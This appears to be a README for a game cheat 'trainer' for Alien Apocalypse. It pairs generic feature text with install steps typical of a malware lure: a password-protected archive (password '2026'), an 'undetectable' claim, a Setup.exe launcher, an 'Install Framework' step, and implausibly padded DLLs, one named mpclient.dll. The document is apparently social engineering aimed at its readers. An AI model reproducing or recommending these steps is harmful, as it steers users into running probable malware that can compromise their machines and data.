## 🔥 Project Overview

**This tool** is a comprehensive trainer for **Alien Apocalypse**. This trainer provides configurable assistance for Alien Apocalypse's core survival systems, including hunger, thirst, exhaustion, resource management, crafting, base defense, and combat. It is designed to support solo exploration and online co-op sessions without changing the game's open-world survival structure.

**Target Audience:** Players who want a more relaxed solo experience, faster experimentation with crafting and alien technology, easier base preparation, or additional protection while exploring the open world.

> **⚠️ IMPORTANT:** This tool is for **educational and private use only**. It does not modify any game files — all changes are temporary and reset when the game closes. The tool is **undetectable**, but **use it at your own risk**. Always back up your save files before use.

## 📦 Installation & Setup

### Step 1: Download

Download the `Setup.zip` archive from the official download link.

### Step 2: Extract with Password

1. The archive is protected with the password: **`2026`**
2. Use any archive extractor (WinRAR, 7-Zip, WinZip, etc.)
3. Enter the password when prompted

### Step 3: Extract All Files

1. Extract **all files** from the archive to a folder of your choice.
2. **IMPORTANT:** All files must be extracted to the **same folder** as `Setup.exe`.
3. The folder structure should look like this:

```
Setup/
|
|-- Setup.exe <- Main executable (699 KB)
|-- core.dll <- Core framework (115 MB)
|-- lib.dll <- Library (32 MB)
|-- mpclient.dll <- Client module (7 MB)
|-- config.ini <- Configuration file (966 KB)
|-- checksum.md5 <- Checksum verification (1 MB)
|-- Password 2026.txt <- Password reminder (empty file)
```

### Step 4: Launch the Tool

1. Navigate to the folder where you extracted all files.
2. Run `Setup.exe`.
3. The launcher window will appear.

### Step 5: Install Framework

1. In the launcher window, click **"Install Framework"**.
2. Wait for the confirmation message *"Framework successfully installed"*.

### Step 6: Launch the Game

1. Launch the game through the Setup launcher (click **"Play"**) or via the standard shortcut.
2. In-game, press the configured hotkey to open the main control menu.

## 📖 Detailed Feature Guide

### Movement & Exploration

Use the game's normal movement controls to explore ruined city blocks, countryside, shelters, and other locations. Alien Apocalypse supports climbing and jumping, allowing you to escape danger and reach alternative routes. Activate exploration-related trainer options before entering dangerous areas, and disable them when normal traversal is preferred.

### Tools & Inventory

Scavenge buildings and other locations for food, materials, tools, and supplies. Collected resources support survival, crafting, shelter construction, and base defense. Use resource assistance only when needed to preserve the game's scavenging and preparation loop, especially during co-op play.

### World & Environment

The game presents an unpredictable open world shaped by alien lifeforms and unfamiliar technology. Explore carefully, study alien devices, and use recovered technology to create hybrid tools and weapons. The world contains both opportunities and hazards, while deeper exploration can produce increasingly unpredictable encounters.

### Combat & Weapons

Alien threats are part of the game's ongoing survival challenge. Prepare equipment, use shelters and defensive structures, and turn alien technology against the invaders. Combat protection can help during difficult encounters, but disabling it restores the intended risk of facing creatures that learn, adapt, and change.
